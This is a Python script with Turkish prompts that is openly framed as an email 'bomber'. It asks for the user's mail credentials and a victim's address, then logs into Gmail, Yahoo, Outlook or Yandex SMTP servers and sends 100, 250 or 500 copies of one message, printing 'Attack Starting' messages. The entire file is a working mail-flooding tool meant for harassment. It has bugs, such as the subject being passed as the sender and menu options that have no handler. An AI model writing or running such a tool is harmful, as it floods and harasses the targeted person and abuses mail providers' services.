import smtplib
import time
print("-------------------------------------------------------------------------------")
print("""
      Hangi mail servisini kullanacaksınız?
      |Gmail:1
      ,Yahoo:2
      ,Outlook:3
      ,Yandex mail:4|
      |İcloud:5
      ,ZohoMail: 6|     
      """)
secim = str(input("Yukarıdaki işlemlerden birisiniz seçiniz: "))
print("--------------------------------------------")
mıktar = str(input("Ne kadar mail göndereceksiniz|1:(100),2:(250),3:(500): "))
print("--------------------------------------------")
#########################################
def gmail_bomber():
    if secim == "1":
        try:
            emaıl_adress = str(input("Email Adresinizi Giriniz: "))
            print("-----------------------------------------------------------")
            emaıl_password = str(input("Email Password'unuzu Giriniz: "))
            print("-----------------------------------------------------------")
            emaıl_subject = str(input("Email Konu Başlığını Giriniz: "))
            print("-----------------------------------------------------------")
            send_emaıl = str(input("Gönderilecek Email Adresini Giriniz: "))
            print("-----------------------------------------------------------")
            text_maıl = str(input("Gönderilecek Mesajı Giriniz: "))
            print("-----------------------------------------------------------")
        except ValueError:
            print("Mail'i gönderirken bir hata oluştur?")
        else:
            print("-----------------------------------------------------------")
            print("Attack Startings...")
            print("---------------------")
            time.sleep(3)
            if mıktar == "1":
                for send in range(0,100):
                    try:
                        mail = smtplib.SMTP("smtp.gmail.com",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            elif mıktar == "2":
                for send in range(0,250):
                    try:
                        mail = smtplib.SMTP("smtp.gmail.com",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            elif mıktar == "3":
                for send in range(0,500):
                    try:
                        mail = smtplib.SMTP("smtp.gmail.com",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            else:
                print("Böyle bir işlem yoktur!")
    else:
        print("Böyle bir işlem yoktur!")
def yahoo_bomber():
    if secim == "2":
        try:
            emaıl_adress = str(input("Email Adresinizi Giriniz: "))
            print("-----------------------------------------------------------")
            emaıl_password = str(input("Email Password'unuzu Giriniz: "))
            print("-----------------------------------------------------------")
            emaıl_subject = str(input("Email Konu Başlığını Giriniz: "))
            print("-----------------------------------------------------------")
            send_emaıl = str(input("Gönderilecek Email Adresini Giriniz: "))
            print("-----------------------------------------------------------")
            text_maıl = str(input("Gönderilecek Mesajı Giriniz: "))
            print("-----------------------------------------------------------")
        except ValueError:
            print("Mail'i gönderirken bir hata oluştur?")
        else:
            print("-----------------------------------------------------------")
            print("Attacks Starting...")
            print("---------------------")
            time.sleep(3)
            if mıktar == "1":
                for send in range(0,100):
                    try:
                        mail = smtplib.SMTP("smtp.mail.yahoo.com",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            elif mıktar == "2":
                for send in range(0,250):
                    try:
                        mail = smtplib.SMTP("smtp.mail.yahoo.com",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            elif mıktar == "3":
                for send in range(0,500):
                    try:
                        mail = smtplib.SMTP("smtp.mail.yahoo.com",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            else:
                print("Böyle bir işlem yoktur!")
    print("Böyle bir işlem yoktur!")
def outlook_bomber():
    if secim == "3":
        try:
            emaıl_adress = str(input("Email Adresinizi Giriniz: "))
            print("-----------------------------------------------------------")
            emaıl_password = str(input("Email Password'unuzu Giriniz: "))
            print("-----------------------------------------------------------")
            emaıl_subject = str(input("Email Konu Başlığını Giriniz: "))
            print("-----------------------------------------------------------")
            send_emaıl = str(input("Gönderilecek Email Adresini Giriniz: "))
            print("-----------------------------------------------------------")
            text_maıl = str(input("Gönderilecek Mesajı Giriniz: "))
            print("-----------------------------------------------------------")
        except ValueError:
            print("Mail'i gönderirken bir hata oluştur?")
        else:
            print("-----------------------------------------------------------")
            print("Attacks Starting...")
            print("---------------------")
            time.sleep(3)
            if mıktar == "1":
                for send in range(0,100):
                    try:
                        mail = smtplib.SMTP("smtp-mail.outlook.com",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            elif mıktar == "2":
                for send in range(0,250):
                    try:
                        mail = smtplib.SMTP("smtp-mail.outlook.com",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            elif mıktar == "3":
                for send in range(0,500):
                    try:
                        mail = smtplib.SMTP("smtp-mail.outlook.com",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            else:
                print("Böyle bir işlem yoktur!")
    else:
        print("Böyle bir işlem yoktur!")
def yandexMaıl_bomber():
    if secim == "4":
        try:
            emaıl_adress = str(input("Email Adresinizi Giriniz: "))
            print("-----------------------------------------------------------")
            emaıl_password = str(input("Email Password'unuzu Giriniz: "))
            print("-----------------------------------------------------------")
            emaıl_subject = str(input("Email Konu Başlığını Giriniz: "))
            print("-----------------------------------------------------------")
            send_emaıl = str(input("Gönderilecek Email Adresini Giriniz: "))
            print("-----------------------------------------------------------")
            text_maıl = str(input("Gönderilecek Mesajı Giriniz: "))
            print("-----------------------------------------------------------")
        except ValueError:
            print("Mail'i gönderirken bir hata oluştur?")
        else:
            print("-----------------------------------------------------------")
            print("Attacks Starting...")
            print("---------------------")
            time.sleep(3)
            if mıktar == "1":
                for send in range(0,100):
                    try:
                        mail = smtplib.SMTP("smtp.yandex.ru",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            elif mıktar == "2":
                for send in range(0,250):
                    try:
                        mail = smtplib.SMTP("smtp.yandex.ru",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            elif mıktar == "3":
                for send in range(0,500):
                    try:
                        mail = smtplib.SMTP("smtp.yandex.ru",587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(emaıl_adress,emaıl_password)
                        mail.sendmail(emaıl_subject,send_emaıl,text_maıl)
                    except (smtplib.SMTPAuthenticationError,TypeError,ValueError,smtplib.SMTPRecipientsRefused):
                        print("Mail'i gönderirken bir hata oluştu?")
                    else:
                        print("Packets Send...")
            else:
                print("Böyle bir işlem yoktur!")
    else:
        print("Böyle bir işlem yoktur!")

################################################################
gmail_bomber()
yahoo_bomber()
outlook_bomber()
yandexMaıl_bomber()
print("bitti")


